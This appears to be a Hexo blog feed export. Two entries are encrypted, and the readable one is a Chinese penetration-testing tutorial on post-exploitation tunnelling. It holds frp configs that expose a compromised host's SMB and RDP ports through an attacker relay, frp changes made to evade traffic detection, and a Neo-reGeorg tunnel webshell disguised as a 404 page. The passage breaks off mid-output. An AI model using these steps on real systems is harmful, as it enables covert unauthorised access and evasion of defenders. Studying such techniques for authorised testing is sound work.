  <script id="hbeData" type="hbeData" data-hmacdigest="fe8cc9e8e651bf10bdee690168d10acac9993d74dcd4c5262dc9763cc6c56acc">2d806215ddc7c4fd1f6babc1a9ab678d5631f1876bfd11d63fd6ecbf724f9357</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Linux kernel</category>
      </categories>
      <tags>
        <tag>Linux_kernel的内存管理</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透手札之Linux权限提升与权限维持</title>
    <url>/2024/01/23/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8BLinux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fe8cc9e8e651bf10bdee690168d10acac9993d74dcd4c5262dc9763cc6c56acc">2d806215ddc7c4fd1f6babc1a9ab678d5631f1876bfd11d63fd6ecbf724f9357</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Linux提权与维持</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透手札之Windows权限提升与权限维持</title>
    <url>/2024/01/23/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8BWindows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fe8cc9e8e651bf10bdee690168d10acac9993d74dcd4c5262dc9763cc6c56acc">2d806215ddc7c4fd1f6babc1a9ab678d5631f1876bfd11d63fd6ecbf724f9357</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Windows提权与维持</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透手札之内网穿透</title>
    <url>/2024/01/22/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
    <content><![CDATA[<h1 id="内⽹穿透"><a href="#内⽹穿透" class="headerlink" title="内⽹穿透"></a>内⽹穿透</h1><p>内⽹穿透，也即 NAT 穿透，进⾏ NAT 穿透是为了使具有某⼀个特定源 IP 地址和源端⼝号的数据包不被 NAT 设备屏蔽⽽正确路由到内⽹主机。</p>
<h2 id="代理概述"><a href="#代理概述" class="headerlink" title="代理概述"></a>代理概述</h2><p>代理其实就是⼀个中介，A和B本来可以直连，中间插⼊⼀个C，C就是中介，比如<code>Brupsuite</code>。</p>
<h3 id="Socks协议"><a href="#Socks协议" class="headerlink" title="Socks协议"></a>Socks协议</h3><p>中⽂意思：防⽕墙安全会话转换协议，⼯作在OSI参考模型的第5层（会话层）。<br>它是⼀种可以穿透防⽕墙的协议，因为Socks介于传输层与表示层之间，使⽤TCP协议传输数据，因⽽不提供如传递ICMP信息之类的⽹络层相关服务。Socks不⽀持ICMP，不能使⽤ping命令。</p>
<h3 id="正向代理简介"><a href="#正向代理简介" class="headerlink" title="正向代理简介"></a>正向代理简介</h3><p>正向代理类似⼀个跳板机，代理访问外部资源⽐如我们国内访问⾕歌，直接访问访问不到，我们可以通过⼀个正向代理服务器，请求发到代理服，代理服务器能够访问⾕歌，这样由代理去⾕歌取到返回数据，再返回给我们，这样我们就能访问⾕歌了。</p>
<h3 id="反向代理简介"><a href="#反向代理简介" class="headerlink" title="反向代理简介"></a>反向代理简介</h3><p>刚开始的时候，代理多数是帮助内⽹client访问外⽹server⽤的。后来出现了反向代理，反向其实是指⽅向相反，即代理将来⾃外⽹客户端的请求转发到内⽹服务器，从外到内。反向代理实际运⾏⽅式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部⽹络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为⼀个服务器。</p>
<h3 id="代理的意义"><a href="#代理的意义" class="headerlink" title="代理的意义"></a>代理的意义</h3><p>我们在获得外⽹服务器的⼀定权限后发现这台服务器可以直接或者间接的访问内⽹ ，此时渗透测试进⼊后渗透阶段，⼀般情况下，内⽹中的其他机器是不允许来⾃外⽹机器的访问的。这时候，我们可以将这台外⽹服务器设置成为代理，使得我们⾃⼰的攻击机可以直接访问与操作内⽹中其他机器。按照代理协议在TCP&#x2F;IP协议栈中所处的位置，可以将正向代理分为HTTP代理和socks代理。HTTP代理技术要求所有代理流量按照HTTP协议进⾏传输，使⽤socks代理技术则可以在直接在⽹络层传输代理数据包。HTTP代理⼯作在应⽤层，socks代理⼯作在⽹络层，所以socks代理技术⽐HTTP代理快很多。</p>
<h3 id="Proxifier"><a href="#Proxifier" class="headerlink" title="Proxifier"></a>Proxifier</h3><p> Proxifier是一款功能非常强大的socks5客户端，可以让不支持通过代理服务器工作的网络程序能通过HTTPS或SOCKS代理或代理链。支持 64位系统，支持Xp，Vista，Win7，MAC OS  ,支持socks4，socks5，http代理协议，支持TCP，UDP协议，可以指定端口，指定IP，指定域名，指定程序等运行模式，兼容性非常好。有许多网络应用程序不支持通过代理服务器工作，Proxifier 解决了这些问题和所有限制，让你有机会不受任何限制使用你喜爱的软件。此外，它让你获得了额外的网络安全控制，创建代理隧道，并添加使用更多网络功能的权力。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/lnetstab.png"
                      alt="lnetstab"
                ></p>
<h1 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h1><p>反向代理的前提就是目标机器出网。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/reverse_proxy.png"
                      alt="reverse_proxy"
                ></p>
<h2 id="花生壳"><a href="#花生壳" class="headerlink" title="花生壳"></a>花生壳</h2><p>好处是商用，天然免杀，坏处是要直接在目标服务器安装，且这两年收费了。。。就不做介绍了。</p>
<h2 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h2><p>很好用的<strong>开源</strong>反向代理工具，<del>不过容易被杀</del>。我们用上图的拓朴做讲解。下载链接 <a class="link"   href="https://github.com/fatedier/frp%E3%80%82" >https://github.com/fatedier/frp。 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="服务端配置"><a href="#服务端配置" class="headerlink" title="服务端配置"></a>服务端配置</h3><p>服务端可以是我们自己的vps或者有公网ip的服务器，我们这里用ubuntu:20.04为例(ip:192.168.188.133)。服务端程序为frps，frps.toml为配置文件，其内容如下：</p>
<div class="highlight-container" data-rel="Toml"><figure class="iseeu highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="attr">bindPort</span> = <span class="number">7000</span></span><br><span class="line"><span class="comment"># WenUI 端口</span></span><br><span class="line"><span class="attr">webServer.port</span> = <span class="number">7500</span></span><br><span class="line"><span class="comment"># WebUI 的账号密码</span></span><br><span class="line"><span class="attr">webServer.user</span> = <span class="string">&quot;admin&quot;</span></span><br><span class="line"><span class="attr">webServer.password</span> = <span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>webServer 可选，开启以后比较方便查看连接进来的机器。</p>
<p>运行命令：</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">$ ./frps -c frps.toml</span><br><span class="line">2024/01/22 20:00:35 [I] [root.go:104] frps uses config file: frps.toml</span><br><span class="line">2024/01/22 20:00:35 [I] [service.go:225] frps tcp listen on 0.0.0.0:7000</span><br><span class="line">2024/01/22 20:00:35 [I] [root.go:113] frps started successfully</span><br><span class="line">2024/01/22 20:00:35 [I] [service.go:338] dashboard listen on 127.0.0.1:7500</span><br></pre></td></tr></table></figure></div>

<p>运行成功后访问 <code>http://127.0.0.1:7500</code> 并输入上面设置的账号密码会看到如下界面。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240122200245663.png"
                      alt="image-20240122200245663"
                ></p>
<h3 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h3><p>“客户端” 就是我们控制的目标机器，我这里以windows server 2008 R2为例(ip:192.168.188.130)。frpc是客户端程序，frpc.toml是配置文件，其内容如下：</p>
<div class="highlight-container" data-rel="Toml"><figure class="iseeu highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 服务端IP和对应端口</span></span><br><span class="line"><span class="attr">serverAddr</span> = <span class="string">&quot;192.168.188.133&quot;</span></span><br><span class="line"><span class="attr">serverPort</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="attr">webServer.port</span> = <span class="number">7500</span></span><br><span class="line"><span class="attr">webServer.user</span> = <span class="string">&quot;admin&quot;</span></span><br><span class="line"><span class="attr">webServer.password</span> = <span class="string">&quot;admin&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[[proxies]]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;test-tcp-1&quot;</span></span><br><span class="line"><span class="attr">type</span> = <span class="string">&quot;tcp&quot;</span></span><br><span class="line"><span class="attr">localIP</span> = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="attr">localPort</span> = <span class="number">445</span></span><br><span class="line"><span class="attr">remotePort</span> = <span class="number">7001</span></span><br><span class="line"></span><br><span class="line"><span class="section">[[proxies]]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;test-tcp-2&quot;</span></span><br><span class="line"><span class="comment"># 连接类型</span></span><br><span class="line"><span class="attr">type</span> = <span class="string">&quot;tcp&quot;</span></span><br><span class="line"><span class="attr">localIP</span> = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="comment"># 本地要映射的端口</span></span><br><span class="line"><span class="attr">localPort</span> = <span class="number">3389</span></span><br><span class="line"><span class="comment"># 映射到远程的端口</span></span><br><span class="line"><span class="attr">remotePort</span> = <span class="number">7002</span></span><br></pre></td></tr></table></figure></div>

<p>内容很直观，不再解释。</p>
<p>运行命令：</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">&gt; .\frpc.exe -c frpc.toml</span><br><span class="line">2024/01/22 20:08:00 [I] [root.go:141] start frpc service <span class="keyword">for</span> config file [.\frpc.toml]</span><br><span class="line">2024/01/22 20:08:00 [I] [service.go:287] try to connect to server...</span><br><span class="line">2024/01/22 20:08:00 [I] [service.go:279] [1a9b265121ca3fcb] login to server success, get run <span class="built_in">id</span> [1a9b265121ca3fcb]</span><br><span class="line">2024/01/22 20:08:00 [I] [proxy_manager.go:173] [1a9b265121ca3fcb] proxy added: [test-tcp-1 test-tcp-2]</span><br><span class="line">2024/01/22 20:08:00 [I] [service.go:177] admin server listen on 127.0.0.1:7500</span><br><span class="line">2024/01/22 20:08:00 [I] [control.go:169] [1a9b265121ca3fcb] [test-tcp-1] start proxy success</span><br><span class="line">2024/01/22 20:08:00 [I] [control.go:169] [1a9b265121ca3fcb] [test-tcp-2] start proxy success</span><br></pre></td></tr></table></figure></div>

<h3 id="攻击机连接"><a href="#攻击机连接" class="headerlink" title="攻击机连接"></a>攻击机连接</h3><p>我们操控的机器，以kali为例。直接运行 <code>rdesktop 192.168.133:7002</code> 进行远程桌面连接到我们的目标机器。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240122201523740.png"
                      alt="image-20240122201523740"
                ></p>
<h3 id="特征修改-免杀"><a href="#特征修改-免杀" class="headerlink" title="特征修改(免杀)"></a>特征修改(免杀)</h3><p>有些局域网会进行流量和特征识别，从而进行拦截，可以使用 frp 的流量加密与压缩功能。但自从 frp v0.50开始，已经默认进行tls加密了。frp 连接时，客户端会发起请求到服务端，请求的内容是固定的，包含目标机器的一些信息，信息字段我们可以进行修改，文件在 <code>pkg/msg/msg.go</code> 中。</p>
<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// When frpc start, client send this message to login to server.</span></span><br><span class="line"><span class="keyword">type</span> Login <span class="keyword">struct</span> &#123;</span><br><span class="line">	Version      <span class="type">string</span>            <span class="string">`json:&quot;version,omitempty&quot;`</span></span><br><span class="line">	Hostname     <span class="type">string</span>            <span class="string">`json:&quot;hostname,omitempty&quot;`</span></span><br><span class="line">	Os           <span class="type">string</span>            <span class="string">`json:&quot;os,omitempty&quot;`</span></span><br><span class="line">	Arch         <span class="type">string</span>            <span class="string">`json:&quot;arch,omitempty&quot;`</span></span><br><span class="line">	User         <span class="type">string</span>            <span class="string">`json:&quot;user,omitempty&quot;`</span></span><br><span class="line">	PrivilegeKey <span class="type">string</span>            <span class="string">`json:&quot;privilege_key,omitempty&quot;`</span></span><br><span class="line">	Timestamp    <span class="type">int64</span>             <span class="string">`json:&quot;timestamp,omitempty&quot;`</span></span><br><span class="line">	RunID        <span class="type">string</span>            <span class="string">`json:&quot;run_id,omitempty&quot;`</span></span><br><span class="line">	Metas        <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span> <span class="string">`json:&quot;metas,omitempty&quot;`</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Currently only effective for VirtualClient.</span></span><br><span class="line">	ClientSpec ClientSpec <span class="string">`json:&quot;client_spec,omitempty&quot;`</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Some global configures.</span></span><br><span class="line">	PoolCount <span class="type">int</span> <span class="string">`json:&quot;pool_count,omitempty&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<p>frp 为了端口复用，建立 TLS 连接时第一个字节固定为 <code>0x17</code>，且后面数据包大小为 317。代码位置在 <code>pkg/util/net/tls.go</code>，其信息也可以修改，可以把第一个字符改为其他16进制。</p>
<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> net</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;crypto/tls&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line">	libnet <span class="string">&quot;github.com/fatedier/golib/net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> FRPTLSHeadByte = <span class="number">0x17</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CheckAndEnableTLSServerConnWithTimeout</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	c net.Conn, tlsConfig *tls.Config, tlsOnly <span class="type">bool</span>, timeout time.Duration,</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span> (out net.Conn, isTLS <span class="type">bool</span>, custom <span class="type">bool</span>, err <span class="type">error</span>) &#123;</span><br><span class="line">	sc, r := libnet.NewSharedConnSize(c, <span class="number">2</span>)</span><br><span class="line">	buf := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1</span>)</span><br><span class="line">	<span class="keyword">var</span> n <span class="type">int</span></span><br><span class="line">	_ = c.SetReadDeadline(time.Now().Add(timeout))</span><br><span class="line">	n, err = r.Read(buf)</span><br><span class="line">	_ = c.SetReadDeadline(time.Time&#123;&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> &#123;</span><br><span class="line">	<span class="keyword">case</span> n == <span class="number">1</span> &amp;&amp; <span class="type">int</span>(buf[<span class="number">0</span>]) == FRPTLSHeadByte:</span><br><span class="line">		out = tls.Server(c, tlsConfig)</span><br><span class="line">		isTLS = <span class="literal">true</span></span><br><span class="line">		custom = <span class="literal">true</span></span><br><span class="line">	<span class="keyword">case</span> n == <span class="number">1</span> &amp;&amp; <span class="type">int</span>(buf[<span class="number">0</span>]) == <span class="number">0x16</span>:</span><br><span class="line">		out = tls.Server(sc, tlsConfig)</span><br><span class="line">		isTLS = <span class="literal">true</span></span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">if</span> tlsOnly &#123;</span><br><span class="line">			err = fmt.Errorf(<span class="string">&quot;non-TLS connection received on a TlsOnly server&quot;</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		out = sc</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h1><p>如果目标机器不出网的情况下，可以使用正向代理。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/proxy.png"
                      alt="proxy"
                ></p>
<h2 id="Neo-reGeorg-Proxifier"><a href="#Neo-reGeorg-Proxifier" class="headerlink" title="Neo-reGeorg+Proxifier"></a>Neo-reGeorg+Proxifier</h2><p>由于reGeorg年久失修且不支持加密，所以就不介绍了。正向代理很简单无需配置什么，并且脚本是挂在http&#x2F;https服务的，一般不会被查杀，但也需要防止静态查杀，加一些代码，做一些混淆。这里介绍几个常用伪装命令。</p>
<h3 id="伪装与上传"><a href="#伪装与上传" class="headerlink" title="伪装与上传"></a>伪装与上传</h3><p>我们可以把 www目录下的<code>error</code>，文件夹复制出来，用于做伪装。</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; python3 .\neoreg.py generate <span class="literal">-k</span> <span class="number">123456</span> <span class="operator">-f</span> error/<span class="number">404</span>.html <span class="literal">-c</span> <span class="number">404</span></span><br><span class="line">          <span class="string">&quot;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;&#x27;  &#x27;M<span class="variable">$</span>  &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>@m</span></span><br><span class="line"><span class="string">        :<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;&#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;</span></span><br><span class="line"><span class="string">       &#x27;<span class="variable">$</span>&#x27;    &#x27;JZI&#x27;<span class="variable">$</span><span class="variable">$</span>&amp;  <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;</span></span><br><span class="line"><span class="string">                 &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>  &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span></span></span><br><span class="line"><span class="string">                 <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>  J<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;</span></span><br><span class="line"><span class="string">                m<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>  <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>,</span></span><br><span class="line"><span class="string">                <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>@  &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$_</span>          Neo-reGeorg</span></span><br><span class="line"><span class="string">             &#x27;1t<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27; &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&lt;</span></span><br><span class="line"><span class="string">          &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;  <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>          version 5.2.0</span></span><br><span class="line"><span class="string">               &#x27;@<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;  <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;</span></span><br><span class="line"><span class="string">                &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>  &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>@</span></span><br><span class="line"><span class="string">             &#x27;z<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>  @<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span></span></span><br><span class="line"><span class="string">                r<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>   <span class="variable">$</span><span class="variable">$</span>|</span></span><br><span class="line"><span class="string">                &#x27;<span class="variable">$</span><span class="variable">$v</span> c<span class="variable">$</span><span class="variable">$</span></span></span><br><span class="line"><span class="string">               &#x27;<span class="variable">$</span><span class="variable">$v</span> <span class="variable">$</span><span class="variable">$v</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>#</span></span><br><span class="line"><span class="string">               <span class="variable">$</span><span class="variable">$x</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$twelve</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>@<span class="variable">$</span>&#x27;</span></span><br><span class="line"><span class="string">             @<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>@L &#x27;    &#x27;&lt;@<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>`</span></span><br><span class="line"><span class="string">           <span class="variable">$</span><span class="variable">$</span>                 &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    [ Github ] https://github.com/L-codes/Neo-reGeorg</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    [+] Create neoreg server files:</span></span><br><span class="line"><span class="string">       =&gt; neoreg_servers/tunnel.ashx</span></span><br><span class="line"><span class="string">       =&gt; neoreg_servers/tunnel.aspx</span></span><br><span class="line"><span class="string">       =&gt; neoreg_servers/tunnel.go</span></span><br><span class="line"><span class="string">       =&gt; neoreg_servers/tunnel.jsp</span></span><br><span class="line"><span class="string">       =&gt; neoreg_servers/tunnel.jspx</span></span><br><span class="line"><span class="string">       =&gt; neoreg_servers/tunnel.php</span></span><br></pre></td></tr></table></figure></div>

<p>-k 指定密钥，-f 指定伪装文件，-c 指定<code>httpcode</code>，然后把生成的tunnel文件改个名，传到代理服务器中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240123182522130.png"
                      alt="image-20240123182522130"
                ></p>
<h3 id="配置Proxifier"><a href="#配置Proxifier" class="headerlink" title="配置Proxifier"></a>配置Proxifier</h3><p>运行Neo-reGorg，因为我们把网站伪装成了 404，所以需要加<code>--skip</code>。</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; python3 .\neoreg.py <span class="literal">-k</span> <span class="number">123456</span> <span class="literal">-u</span> http://<span class="number">192.168</span>.<span class="number">188.133</span>/tunnel.php <span class="literal">-p</span> <span class="number">10086</span> <span class="literal">--skip</span></span><br><span class="line">          <span class="string">&quot;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;&#x27;  &#x27;M<span class="variable">$</span>  &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>@m</span></span><br><span class="line"><span class="string">        :<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;&#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;</span></span><br><span class="line"><span class="string">       &#x27;<span class="variable">$</span>&#x27;    &#x27;JZI&#x27;<span class="variable">$</span><span class="variable">$</span>&amp;  <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;</span></span><br><span class="line"><span class="string">                 &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>  &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span></span></span><br><span class="line"><span class="string">                 <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>  J<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;</span></span><br><span class="line"><span class="string">                m<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>  <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>,</span></span><br><span class="line"><span class="string">                <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>@  &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$_</span>          Neo-reGeorg</span></span><br><span class="line"><span class="string">             &#x27;1t<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27; &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&lt;</span></span><br><span class="line"><span class="string">          &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;  <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>          version 5.2.0</span></span><br><span class="line"><span class="string">               &#x27;@<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;  <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;</span></span><br><span class="line"><span class="string">                &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>  &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>@</span></span><br><span class="line"><span class="string">             &#x27;z<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>  @<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span></span></span><br><span class="line"><span class="string">                r<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>   <span class="variable">$</span><span class="variable">$</span>|</span></span><br><span class="line"><span class="string">                